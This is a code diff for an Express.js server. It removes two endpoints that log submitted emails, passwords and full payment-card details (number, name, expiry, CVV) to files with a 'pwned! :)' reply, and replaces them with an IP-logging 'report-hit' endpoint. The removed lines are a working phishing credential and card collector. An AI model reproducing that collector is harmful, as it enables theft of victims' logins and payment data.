@@ -5,41 +5,20 @@ const app = express();
 const port = process.env.PORT || 8080;
 
 const limiter = rateLimit({
-  windowMs: 10 * 60 * 1000,
+  windowMs: 10 * 60 * 1000, // 10 minutes
   limit: 5,
   standardHeaders: "draft-8",
-  legacyHeaders: false, // Disable the `X-RateLimit-*` headers.
 });
 
 app.use(express.json());
+app.use(limiter);
 app.use(errorHandler);
 
-app.post("/login-details", (req, res) => {
-  const { email, password } = req.body;
-
-  if (!email || !password) {
-    return res.status(400).json({ error: "Incorrect parameters." });
-  }
-
+app.get("/report-hit", (req, res) => {
+  res.header("Access-Control-Allow-Origin", "alert.samola.net");
   fs.appendFileSync(
-    "logs/login-details-log.txt",
-    `${new Date().toLocaleString("en-US")}\n\n` +
-      `IP: ${req.ip}\nEmail: ${email}\nPassword: ${password}\n\n`
-  );
-  res.status(200).json({ successMessage: "pwned! :)" });
-});
-
-app.post("/card-details", (req, res) => {
-  const { cardNum, nameOnCard, expirationDate, cvv } = req.body;
-
-  if (!cardNum || !nameOnCard || !expirationDate || !cvv) {
-    return res.status(400).json({ error: "Incorrect parameters." });
-  }
-
-  fs.appendFileSync(
-    "logs/card-details-log.txt",
-    `${new Date().toLocaleString("en-US")}\n\n` +
-      `IP: ${req.ip}\nCard Number: ${cardNum}\nName on card: ${nameOnCard}\nExpiration date (M/Y): ${expirationDate}\nSecurity code: ${cvv}\n\n`
+    "logs/hits.txt",
+    `${new Date().toLocaleString("en-US")}\nIP: ${req.ip}\n\n`
   );
   res.status(200).json({ successMessage: "pwned! :)" });
 });
